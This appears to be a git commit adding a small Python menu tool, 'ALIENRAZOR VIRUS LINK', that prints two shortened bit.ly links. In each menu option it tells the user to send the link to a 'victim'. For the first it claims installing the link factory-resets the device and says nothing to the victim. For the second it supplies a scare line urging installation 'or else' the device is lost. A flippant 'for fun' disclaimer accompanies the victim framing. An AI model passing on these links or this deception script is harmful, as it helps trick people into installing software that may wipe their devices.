c2c7941ebc9d8489cb4773ff65932cbc0e763a1a
Alienrazor <99122855+Alienrazor@users.noreply.github.com>
2022-10-11 14:27:55 +0500

    Add files via upload

---
+++ link.py
@@ -0,0 +1,113 @@
+#Alienrazor 
+#python
+#TOOL DANGEROUS LINKS
+
+
+import os
+
+
+logo ="""
+\033[0;91m                 ..              .:.
+              ~YJ^.              .~J5!.
+            ^G@J                   .J@B!
+         ?~ B@Y                      5@&:7?
+        ^@5:#@J                      Y@@!P@^
+        ~@@#&@&7        ....:~      ?@@@#@@^
+       7:J@@@@@7     :75####B7      ?@@@@@J^7
+       !#55#@@@~:    :!~P@@@!      :~@@@#55#!
+        ~P&@@@@5J?^.    !@@@Y   .^JJ5@@@@&P^
+         .7YPB&@BB##BPYY#@@@@YPB##GB@&BPY7.
+          ?B##&@@@@@@@@@@@@@@@@@@@@@@@##G7
+           :?G&@&G#@@@@@@@@@@@@@&#B&@#P7.
+              :~?7~~?#@&@@@@&@B?^!?7^.
+                 !!YP5~~&@@&~~PPJ!!
+                .^7J^  5@@@@Y .^J7^
+                      J@&&&&@?
+                     !#&G##B&#!
+                     G5&5##P&PG
+                     Y7&Y##5#7Y
+                     ..GJ##5P..
+                       J?#&Y?
+                       ~7#&J^
+                       .~#&!.
+                        .#&:
+                        .B&:
+                         G#.
+                         GB
+                         5P
+                         7J
+                         .        
+            
+              ALIENRAZOR VIRUS LINK\033[0;96m     
+"""                         
+def menu():  
+    os.system ("clear")
+    print(logo)
+    print ("")
+    print ("              [1] Killer link ")
+    print ("              [2] Semi killer")
+    print ("              [3] About this tool")
+    print ("              [4] EXIT.     ")                   
+    alien = input ("\n              CHOOSE > ")
+    if alien in ['1','01']:
+        data1()
+    elif alien in ['2','02']:
+        data()
+    elif alien in ['3','03']:
+        abo()
+    elif alien in ['4','04']:
+        exit()
+
+
+def data1():
+    os.system ("clear")
+    print(logo)
+    print ("")
+    print ("\n\n COPY BELOW LINK AND SEND IT YOUR VICTIM \n AND SAY NOTHING TO HIM. \n WHEN HE INSTALL IT IN HIS DEVICE \n IT WILL BE FACTORY RESET \n AND LOT MORE HAPPENS.")
+    print ("              👇👇👇 ")
+    print ("")
+    print ("  \033[0;92mkiller link :- \033[0;94mhttps://bit.ly/3ild93L")
+    print ("")
+    print ("              👆👆👆  ")
+    print ("\033[0;96m USE ONLY FOR FUN PURPOSE NOT FOR HARMING SOMEONE 😇✌️. \n TOOL OWNER IS NOT RESPONSIBLE FOR ANY KIND OF LOSS \n YOU DO TO OTHER'S BY THIS TOOL.")
+    print ("")
+    alie = input (" TYPE EXIT : ")
+    if alie in ['EXIT','exit','e']:
+        menu()
+
+
+
+
+
+
+def data():
+    os.system("clear")
+    print(logo)
+    print ("")
+    print ("\n\n \033[0;96mCOPY BELOW LINK AND SEND IT YOUR VICTIM AND TELL HIM. \n THAT he SHOULD INSTALL THIS  APPLICATION OR ELSE \n HIS DEVICE WILL NOT BE RECOVERED.(Antivirus)")
+    print ("                   👇👇👇  ")
+    print ("")
+    print ("       \033[0;92mlink :- \033[0;94mhttps://bit.ly/3fX8ljZ ")
+    print ("")
+    print ("                   👆👆👆   ")
+    print ("\033[0;96m USE ONLY FOR FUN PURPOSE NOT FOR HARMING SOMEONE 😇✌️. \n TOOL OWNER IS NOT RESPONSIBLE FOR ANY KIND OF LOSS \n YOU DO TO OTHER'S WITH THIS TOOL.")
+    print ("")
+    alie = input (" TYPE EXIT : ")
+    if alie in ['EXIT','exit','e']:
+        menu()   
+    
+    
+def abo():
+    os.system ("clear")
+    print(logo)
+    print (" \033[0;92mWIPE ALL DATA JUST CLICKING ON LINK")
+    print ("")
+    print ("\033[0;92mWE ARE NOT RESPONSIBLE FOR ANY REASON \n SO BE CAREFUL JUST COPY THE LINK \n AND SEND TO WHERE YOU WANT ")
+    print ("")
+    print ("\033[0;91m     AUTHOR : ALIENRAZOR ")
+    print ("")
+    alie = input (" TYPE EXIT : ")
+    if alie in ['EXIT','exit','e']:
+        menu()
+       
+menu()    
